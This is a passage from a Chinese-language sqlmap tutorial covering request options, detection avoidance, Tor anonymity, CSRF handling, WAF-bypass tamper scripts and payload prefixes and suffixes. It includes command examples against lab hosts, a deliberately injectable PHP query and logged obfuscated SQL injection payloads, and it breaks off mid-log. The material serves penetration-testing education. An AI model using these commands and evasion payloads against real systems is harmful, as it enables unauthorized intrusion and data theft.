<p>默认情况下 Sqlmap 发送的 HTTP 请求中的 User-Agent 值为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev-xxxxxxx (http://sqlmap.org)<br></code></pre></td></tr></table></figure>
<p>使用参数<code>--user-agent</code>可以指定一个 User-Agent 值。但正常的 User-Agent 值长什么样我们可能并不记得，所以有了参数<code>--random-agent</code>，使用该参数，Sqlmap 会从文件./txt/user-agents.txt 中随机地取一个 User-Agent。注意，在一次会话中只有使用同一个 User-Agent，并不是每发一个 HTTP 请求包，都随机一个 User-Agent。</p>
<p>用如下命令统计 user-agents.txt 行数：</p>
<p><code>cat sqlmap/txt/user-agents.txt | wc -l</code></p>
<p>结果为 4211，当然其中还包含空行、注释等，但总的来说该文件中存储的 User-Agent 也有 4 千多个。</p>
<p>当<code>--level</code>设置为 3 或更高时，Sqlmap 会检测 User-Agent 是否存在注入漏洞，关于<code>--level</code>的更多信息见下文。</p>
<h4 id="host">Host</h4>
<blockquote>
<p>参数：<code>--host</code></p>
</blockquote>
<p>使用该参数可以手动指定 HTTP 头中的 Host 值。</p>
<p>当<code>--level</code>设置为 5 或更高时，Sqlmap 会检测 Host 是否存在注入漏洞，关于<code>--level</code>的更多信息见下文。</p>
<h4 id="referer">Referer</h4>
<blockquote>
<p>参数：<code>--referer</code></p>
</blockquote>
<p>使用该参数可以指定 HTTP 头中的 Referer 值。Sqlmap 发送的 HTTP 请求头部默认无 Referer 字段。</p>
<p>当<code>--level</code>设置为 3 或更高时，Sqlmap 会检测 Referer 是否存在注入漏洞，关于<code>--level</code>的更多信息见下文。</p>
<h4 id="额外的-http-头">额外的 HTTP 头</h4>
<blockquote>
<p>参数：<code>--headers</code></p>
</blockquote>
<p>使用该参数可以在 Sqlmap 发送的 HTTP 请求报文头部添加字段，若添加多个字段，用<code>n</code>分隔。如命令：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.101:8080/&quot;</span> -v <span class="hljs-number">5</span> <span class="hljs-attr">--headers</span> <span class="hljs-string">&quot;X-A:A\nX-B: B&quot;</span><br></code></pre></td></tr></table></figure>
<p>发送的 HTTP 请求包为：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-B</span><span class="hljs-punctuation">: </span>B<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.56.101:8080<br><span class="hljs-attribute">Accept-encoding</span><span class="hljs-punctuation">: </span>gzip,deflate<br><span class="hljs-attribute">X-A</span><span class="hljs-punctuation">: </span>A<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>sqlmap/1.1.10#stable (http://sqlmap.org)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
<p>加参数 <code>-v 5</code> 是为了让 Sqlamp 输出发送的 HTTP 请求包，便于我们观察。</p>
<h4 id="http-请求之间添加延迟">HTTP 请求之间添加延迟</h4>
<blockquote>
<p>参数：<code>--delay</code></p>
</blockquote>
<p>过于频繁地发送请求可能会被网站察觉或有其他不良后果。使用参数<code>--delay</code>来指定 HTTP 请求之间的延迟，单位为秒，类型是浮点数，如<code>--delay 1.5</code>表示延迟 1.5 秒。默认是没有延迟的。</p>
<h4 id="超时时间">超时时间</h4>
<blockquote>
<p>参数：<code>--timeout</code></p>
</blockquote>
<p>超时时间默认为 30 秒，可以用参数<code>--timeout</code>指定超时时间，如<code>--timeout 44.5</code>表示设置超时时间为 44.5 秒。</p>
<h4 id="超时后最大重试次数">超时后最大重试次数</h4>
<blockquote>
<p>参数：<code>--retries</code></p>
</blockquote>
<p>超时后 Sqlmap 会进行重试，最大重试次数默认为 3，可以用参数<code>--retries</code>指定最大重试次数。</p>
<h4 id="避免错误请求过多而被屏蔽">避免错误请求过多而被屏蔽</h4>
<blockquote>
<p>参数：<code>--safe-url</code>、<code>--safe-post</code>、<code>--safe-req</code> 和<code>--safe-freq</code></p>
</blockquote>
<p>有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而 Sqlmap 的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。有以下四个参数与这一机制有关：</p>
<ul>
<li><code>--safe-url</code>: 隔一会就访问一下的安全 URL</li>
<li><code>--safe-post</code>: 访问安全 URL 时携带的 POST 数据</li>
<li><code>--safe-req</code>: 从文件中载入安全 HTTP 请求</li>
<li><code>--safe-freq</code>: 每次测试请求之后都会访问一下的安全 URL</li>
</ul>
<p>这里所谓的安全 URL 是指访问会返回 200、没有任何报错的 URL。相应地，Sqlmap 也不会对安全 URL 进行任何注入测试。</p>
<h4 id="关闭-url-编码">关闭 URL 编码</h4>
<blockquote>
<p>参数：<code>--skip-urlencode</code></p>
</blockquote>
<p>Sqlmap 默认会对 URL 进行 URL 编码，可以使用该参数关闭 URL 编码。</p>
<h4 id="绕过-csrf-保护">绕过 CSRF 保护</h4>
<blockquote>
<p>参数：<code>--csrf-token</code> 和<code>--csrf-url</code></p>
</blockquote>
<p>现在有很多网站通过在表单中添加值为随机生成的 token 的隐藏字段来防止 CSRF 攻击，Sqlmap 会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。</p>
<p><code>--csrf-token</code>用于指定包含 token 的隐藏字段名，若这个字段名不是常见的防止 CSRF 攻击的字段名 Sqlmap 可能不能自动识别出，需要手动指定。如 Django 中该字段名为<code>csrfmiddlewaretoken</code>，明显与 CSRF 攻击有关。</p>
<p><code>--csrf-url</code>用于从任意的 URL 中回收 token 值。若最初有漏洞的目标 URL 中没有包含 token 值而又要求在其他地址提取 token 值时该参数就很有用。</p>
<h4 id="在每次请求前执行特定-python-代码">在每次请求前执行特定 Python 代码</h4>
<blockquote>
<p>参数：<code>--eval</code></p>
</blockquote>
<p>直接看例子</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;</span> --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br></code></pre></td></tr></table></figure>
<p>每次发送请求前，Sqlmap 都会依据 id 值重新计算 hash 值并更新 GET 请求中的 hash 值。</p>
<h4 id="随机化参数值">随机化参数值</h4>
<blockquote>
<p>参数：<code>--randomize</code></p>
</blockquote>
<p>使用该参数，Sqlmap 会随机生成每次 HTTP 请求中参数的值，值的类型和长度依照于原始值。</p>
<h4 id="身份认证">身份认证</h4>
<blockquote>
<p>参数：<code>--auth-type</code> 和<code>--auth-cred</code></p>
</blockquote>
<p>这些参数用于进行身份认证。<code>--auth-type</code>用于指定认证方式，支持以下三种身份认证方式：</p>
<p>Basic</p>
<p>Digest</p>
<p>NTLM</p>
<p><code>--auth-cred</code>用于给出身份认证的凭证，格式是<code>username:password</code>。</p>
<p>如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span> <span class="hljs-attr">--auth-type</span> Basic <span class="hljs-attr">--auth-cred</span> <span class="hljs-string">&quot;testuser:testpass&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="基于证书的身份认证">基于证书的身份认证</h4>
<blockquote>
<p>参数：<code>--auth-file</code></p>
</blockquote>
<p>若 Web 服务器要求客户端提供证书则可以使用此参数指定一个 PEM 格式的证书文件。我们知道 SSL 协议的客户端认证是可选的，实践中一般都只用服务器端提供自己的证书供客户端验证，很少要求客户端提供自己的证书。</p>
<h4 id="忽略-401">忽略 401</h4>
<blockquote>
<p>参数：<code>--ignore-401</code></p>
</blockquote>
<p>使用该参数忽略 401 错误（未认证）。</p>
<h4 id="https代理">HTTP(S)代理</h4>
<blockquote>
<p>参数：<code>--proxy</code>、<code>--proxy-cred</code>、<code>--proxy-file</code> 和<code>--ignore-proxy</code></p>
</blockquote>
<p>使用参数<code>--proxy</code>来设置一个 HTTP(S)代理，格式是<code>http(s)://url:port</code>。若代理需要认证，使用参数<code>--proxy-cred</code>来提供认证凭证，格式是<code>username:password</code>。</p>
<p>使用参数<code>--proxy-file</code>指定一个存储着代理列表的文件，Sqlmap 会依次使用文件中的代理，当某个代理有任何连接问题时就会被弃用而换下一个代理。</p>
<p>使用参数<code>--ignore-proxy</code>忽略本地代理设置。</p>
<h4 id="tor-匿名网络">Tor 匿名网络</h4>
<p>参数：<code>--tor</code>、<code>--tor-type</code>、<code>--tor-port</code> 和<code>--check-tor</code></p>
<p>不管出于什么原因，如果想要保持匿名状态与其使用单个的 HTTP(S)代理，不如安装类似 Privoxy 这样的软件按照<a target="_blank" rel="noopener" href="https://www.torproject.org/docs/installguide.html.en">Tor 的安装指导</a>配置一个 Tor 客户端。设置好后使用参数<code>--tor</code>让 Sqlmap 自动设置使用 Tor 代理。</p>
<p>如果想要手动指定 Tor 的类型和端口可以使用参数<code>--tor-type</code>和<code>--tor-port</code>，如：</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">tor</span><span class="hljs-literal">-</span><span class="hljs-comment">type=SOCKS5</span> <span class="hljs-literal">--</span><span class="hljs-comment">tor</span><span class="hljs-literal">-</span><span class="hljs-comment">port 9050</span><br></code></pre></td></tr></table></figure>
<p>如果要求高度的匿名性可以使用参数<code>--check-tor</code>，加上该参数后 Sqlmap 会确保所有流量都走 Tor 代理，若 Tor 代理失效，Sqlmap 会发出警告并退出。检测方法是访问<a target="_blank" rel="noopener" href="https://check.torproject.org/">Are you using Tor?</a>。</p>
<h4 id="用正则表达式过滤代理日志">用正则表达式过滤代理日志</h4>
<blockquote>
<p>参数：<code>--scope</code></p>
</blockquote>
<p>指定一个 Python 正则表达式对代理日志进行过滤，只测试符合正则表达式的目标，如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -l burp<span class="hljs-selector-class">.log</span> <span class="hljs-attr">--scope</span>=<span class="hljs-string">&quot;(www)?\.target\.(com|net|org)&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="强制使用-ssl">强制使用 SSL</h4>
<blockquote>
<p>参数：<code>--force-ssl</code></p>
</blockquote>
<h3 id="优化">优化</h3>
<h4 id="一键优化">一键优化</h4>
<blockquote>
<p>参数：-o</p>
</blockquote>
<p>添加此参数相当于同时添加下列三个优化参数：</p>
<ul>
<li><code>--keep-alive</code></li>
<li><code>--null-connection</code></li>
<li><code>--threads=3</code> （如果没有设置一个好的值）</li>
</ul>
<p>这些参数具体含义见后文。</p>
<h4 id="http-长连接">HTTP 长连接</h4>
<blockquote>
<p>参数：<code>--keep-alive</code></p>
</blockquote>
<p>该参数让 Sqlmap 使用 HTTP 长连接。该参数与<code>--proxy</code>矛盾。</p>
<h4 id="http-空连接">HTTP 空连接</h4>
<blockquote>
<p>参数：<code>--null-connection</code></p>
</blockquote>
<p>有一种特殊的 HTTP 请求类型可以直接获得 HTTP 响应的大小而不用获得 HTTP 响应体。显然这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的。该参数与<code>--text-only</code>矛盾。</p>
<h4 id="http-并发">HTTP 并发</h4>
<blockquote>
<p>参数：<code>--threads</code></p>
</blockquote>
<p>使用该参数指定 Sqlmap 可以达到的最大并发数。从性能和网站承受能力两方面考虑最大并发数不要超过 10。</p>
<h2 id="注入阶段">注入阶段</h2>
<h3 id="检测注入点">检测注入点</h3>
<h4 id="要测试的注入点">要测试的注入点</h4>
<blockquote>
<p>参数：<code>-p</code> 和<code>--skip</code></p>
</blockquote>
<p>默认情况下 Sqlmap 会测试所有 GET 参数和 POST 参数，当 level 大于等于 2 时会测试 cookie 参数，当 level 大于等于 3 时会测试 User-Agent 和 Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受 level 限制。这就是<code>-p</code>的作用。</p>
<p>举个例子，若想只测试 GET 参数<code>id</code>和 User-Agent，则可以这么写：</p>
<p><code>-p "id,user-agent"</code></p>
<p>如果不想测试某一参数则可以使用<code>--skip</code>。如设置了 level 为 5 但不想测试 User-Agent 和 Referer，则可以这么写：</p>
<p><code>--level=5 --skip="user-agent,referer"</code></p>
<p>有时会遇到伪静态网页。像动态网页会明目张胆地列出参数，如：</p>
<p><code>/user.php?id=1</code></p>
<p>显然参数是 id，值为 1。但若是伪静态网页则可能这样写：</p>
<p><code>/user/1/</code></p>
<p>将参数隐藏在 URL 中。通常情况下 Sqlmap 不会对这样的伪静态网页的参数做测试，因为 Sqlmap 无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上<code>*</code>，告诉 Sqlmap 哪个是伪静态参数就行，剩下事的和 GET 参数没有什么区别。如：</p>
<p><code>python sqlmap.py -u "http(s)://target.cc/user/1*/"</code></p>
<h4 id="指定数据库管理系统">指定数据库管理系统</h4>
<blockquote>
<p>参数：<code>--dbms</code></p>
</blockquote>
<p>dbms 是<code>Database Management System</code>的缩写。默认情况下 Sqlmap 会自动检测网站使用的数据库管理系统，Sqlmap 支持以下这些数据库管理系统：</p>
<ul>
<li>MySQL</li>
<li>Oracle</li>
<li>PostgreSQL</li>
<li>Microsoft SQL Server</li>
<li>Microsoft Access</li>
<li>Firebird</li>
<li>SQLite</li>
<li>Sybase</li>
<li>SAP MaxDB</li>
<li>DB2</li>
</ul>
<p>如果 Sqlmap 自动检测失败或是不想让 Sqlmap 进行数据库指纹检测，可以使用参数<code>--dbms</code>手动指定数据库管理系统，如：<code>--dbms postgresql</code>。</p>
<p>对于 Mysql 和 Microsoft SQL Server 和要这样指定：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--dbms</span> MySQL &lt;<span class="hljs-keyword">version</span>&gt;<br><span class="hljs-params">--dbms</span> Microsoft SQL Server &lt;<span class="hljs-keyword">version</span>&gt;<br></code></pre></td></tr></table></figure>
<p>对于 MySQL 来说，是类似这样的：5.0。对于 Microsoft SQL Server 来说，是类似这样的：2005。</p>
<p>如果在添加<code>--dbms</code>参数的同时还添加了<code>--fingerprint</code>，Sqlmap 只会在指定的数据库管理系统内进行指纹识别。</p>
<p>只有在很确定时使用<code>--dbms</code>，否则还是让 Sqlmap 自动检测更好些。</p>
<h4 id="指定运行数据库管理系统的操作系统">指定运行数据库管理系统的操作系统</h4>
<blockquote>
<p>参数：<code>--os</code></p>
</blockquote>
<p>默认情况下 Sqlmap 会自动检测运行数据库管理系统的操作系统，目前完全支持的操作系统有：</p>
<ul>
<li>Linux</li>
<li>Windows</li>
</ul>
<p>如果很确定可以使用参数<code>--os</code>指定运行数据库管理系统的操作系统。当然在只用很确定时才应该使用此参数，否则还是让 Sqlmap 自动检测更好些。</p>
<h4 id="生成无效参数值时强制使用大数">生成无效参数值时强制使用大数</h4>
<blockquote>
<p>参数：<code>--invalid-bignum</code></p>
</blockquote>
<p>有时在注入测试时需要生成无效参数，一般情况下 Sqlmap 会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加<code>--invalid-bignum</code>，Sqlmap 就会取大数（如：id=99999999）作为无效参数。</p>
<h4 id="生成无效参数值时强制使用逻辑操作符">生成无效参数值时强制使用逻辑操作符</h4>
<blockquote>
<p>参数：<code>--invalid-logical</code></p>
</blockquote>
<p>有时在注入测试时需要生成无效参数，一般情况下 Sqlmap 会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加<code>--invalid-logical</code>，Sqlmap 就会使用逻辑操作符（如：id=13 AND 18=19）作为无效参数。</p>
<h4 id="生成无效参数值时强制使用字符串">生成无效参数值时强制使用字符串</h4>
<blockquote>
<p>参数：<code>--invalid-string</code></p>
</blockquote>
<p>有时在注入测试时需要生成无效参数，一般情况下 Sqlmap 会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加<code>--invalid-logical</code>，Sqlmap 就会使用字符串（如：id=akewmc）作为无效参数。</p>
<h4 id="关闭-payload-转换">关闭 payload 转换</h4>
<p>在检索结果时 Sqlmap 会将所有输入转换为字符串类型，若遇到空值（NULL）则将其替换为空白字符。<br />
这样做是为了防止如连接空值和字符串之类的任何错误发生并可以简化数据检索过程。<br />
但是有报告显示在老版本的 Mysql 中这样做会导致数据检索出现问题，因此添加了<code>--no-cast</code>来告诉 Sqlmap 不要这样做。</p>
<h4 id="关闭字符串编码">关闭字符串编码</h4>
<blockquote>
<p>参数：<code>--no-escape</code></p>
</blockquote>
<p>有时 Sqlmap 会使用用单引号括起来的字符串值作为 payload，如<code>SELECT ‘foobar’</code>，默认地这些值会被编码，如上例将被编码为：<br />
<code>SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))</code> 这样做既可以混淆视听让人一时难以洞察 payload 的内容又可以在后台服务器使用类似 magic_quote 或 mysql_real_escape_string 这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减 payload 长度，用户可以使用<code>--no-escape</code>来关闭字符串编码。</p>
<h4 id="定制-payload">定制 payload</h4>
<blockquote>
<p>参数：<code>--prefix</code> 和<code>--suffix</code></p>
</blockquote>
<p>有时只有在 payload 后添加用户指定的后缀才能注入成功。另一种场景是用户已经知道查询语句怎么写的，此时可以直接指定 payload 的前缀和后缀来完成检测和注入。</p>
<p>一个有漏洞的源码示例如下：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">query</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;&quot;</span> . $\_GET[<span class="hljs-string">&#x27;id&#x27;</span>] . <span class="hljs-string">&quot;&#x27;) LIMIT 0, 1&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>对这样的例子可以让 Sqlmap 自动检测边界范围也可以手动指出边界范围：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -<span class="hljs-selector-tag">p</span> id <span class="hljs-attr">--prefix</span> <span class="hljs-string">&quot;&#x27;)&quot;</span> <span class="hljs-attr">--suffix</span> <span class="hljs-string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span><br></code></pre></td></tr></table></figure>
<p>最终 SQL 语句会变成：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=(<span class="hljs-string">&#x27;1&#x27;</span>) &lt;PAYLOAD&gt; <span class="hljs-keyword">AND</span> (<span class="hljs-string">&#x27;abc&#x27;</span>=<span class="hljs-string">&#x27;abc&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>这个句子语法是正确的，payload 也能执行。</p>
<p>在简单的测试环境下 Sqlmap 不需要被提供定制的边界范围就能够自动检测并完成注入，但在真实世界中某些应用可能会很复杂如嵌套 JOIN 查询，此时就需要为 Sqlmap 指明边界范围。</p>
<h4 id="修改注入数据">修改注入数据</h4>
<blockquote>
<p>参数：<code>--tamper</code></p>
</blockquote>
<p>除了用 CHAR() 编码字符串外 Sqlmap 没有对 payload 进行任何混淆。<br />
该参数用于对 payload 进行混淆以绕过 IPS 或 WAF。<br />
该参数后跟一个 tamper 脚本的名字。<br />
若该 tamper 脚本位于 sqlmap 的安装目录的 tamper/目录中，就可以省略路径和后缀名，只写文件名。<br />
多个 tamper 脚本之间用空格隔开。</p>
<p>在 tamper/目录中有许多可用的 tamper 脚本。tamper 脚本的作用是对 payload 进行混淆。<br />
我们还可以自己写 tamper 脚本，这属于 Sqlmap 的高级用法，一个有效的 tamper 脚本如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 必须要导入的库</span><br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-comment"># 定义该 tamper 脚本的优先级</span><br>__priority__ = PRIORITY.NORMAL<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;此处是 tamper 的说明&#x27;&#x27;&#x27;</span><br>    retVal = payload<br>    <span class="hljs-comment"># 此处是用于修改 payload 的代码</span><br>    <span class="hljs-comment"># 返回修改后的 payload</span><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<p>下面是一个示例，该示例的目标是 Mysql，假定大于号、空格和开头的 SELECT 是被禁止的：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.101:8080/ScorePrj/?id=1&quot;</span> \<br><span class="hljs-attr">--tamper</span> tamper/between<span class="hljs-selector-class">.py</span>,tamper/randomcase<span class="hljs-selector-class">.py</span>,tamper/space2comment<span class="hljs-selector-class">.py</span> -v <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>该示例部分输出如下：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">52</span>] [<span class="hljs-symbol">DEBUG</span>] cleaning up configuration parameters<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">52</span>] [<span class="hljs-symbol">INFO</span>] loading tamper script <span class="hljs-string">&#x27;between&#x27;</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">52</span>] [<span class="hljs-symbol">INFO</span>] loading tamper script <span class="hljs-string">&#x27;randomcase&#x27;</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">52</span>] [<span class="hljs-symbol">INFO</span>] loading tamper script <span class="hljs-string">&#x27;space2comment&#x27;</span><br>[...]<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">INFO</span>] testing for <span class="hljs-symbol">SQL</span> injection on <span class="hljs-symbol">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">INFO</span>] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>)<span class="hljs-comment">/**/</span>aNd<span class="hljs-comment">/**/</span><span class="hljs-number">8083</span>=<span class="hljs-number">4737</span><span class="hljs-comment">/**/</span>aNd<span class="hljs-comment">/**/</span>(<span class="hljs-number">4754</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">BetwEen</span><span class="hljs-comment">/**/</span><span class="hljs-number">4754</span><span class="hljs-comment">/**/</span>aNd<span class="hljs-comment">/**/</span><span class="hljs-number">4754</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>)<span class="hljs-comment">/**/</span>anD<span class="hljs-comment">/**/</span><span class="hljs-number">4962</span>=<span class="hljs-number">4962</span><span class="hljs-comment">/**/</span>anD<span class="hljs-comment">/**/</span>(<span class="hljs-number">2361</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">BeTweEN</span><span class="hljs-comment">/**/</span><span class="hljs-number">2361</span><span class="hljs-comment">/**/</span>anD<span class="hljs-comment">/**/</span><span class="hljs-number">2361</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">/**/</span>aNd<span class="hljs-comment">/**/</span><span class="hljs-number">9754</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">BETwEEn</span><span class="hljs-comment">/**/</span><span class="hljs-number">1206</span><span class="hljs-comment">/**/</span>aNd<span class="hljs-comment">/**/</span><span class="hljs-number">1206</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">AnD</span><span class="hljs-comment">/**/</span><span class="hljs-number">4962</span><span class="hljs-comment">/**/</span>beTweEn<span class="hljs-comment">/**/</span><span class="hljs-number">4962</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">AnD</span><span class="hljs-comment">/**/</span><span class="hljs-number">4962</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">/**/</span>aND<span class="hljs-comment">/**/</span><span class="hljs-number">2741</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">BetWeEn</span><span class="hljs-comment">/**/</span><span class="hljs-number">9323</span><span class="hljs-comment">/**/</span>aND<span class="hljs-comment">/**/</span><span class="hljs-number">9323</span>--<span class="hljs-comment">/**/</span><span class="hljs-symbol">Ihsa</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">/**/</span>anD<span class="hljs-comment">/**/</span><span class="hljs-number">4962</span><span class="hljs-comment">/**/</span><span class="hljs-symbol">BetweEN</span><span class="hljs-comment">/**/</span><span class="hljs-number">4962</span><span class="hljs-comment">/**/</span>anD<span class="hljs-comment">/**/</span><span class="hljs-number">4962</span>--<span class="hljs-comment">/**/</span>wVUI<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27;)/**/anD/**/1694=6061/**/anD/**/(&#x27;</span>zLwu<span class="hljs-string">&#x27;=&#x27;</span>zLwu<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27;)/**/ANd/**/4962=4962/**/ANd/**/(&#x27;</span><span class="hljs-symbol">Dsfw</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-symbol">Dsfw</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/aND/**/6307=8901/**/aND/**/&#x27;</span>fKLn<span class="hljs-string">&#x27;=&#x27;</span>fKLn<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span 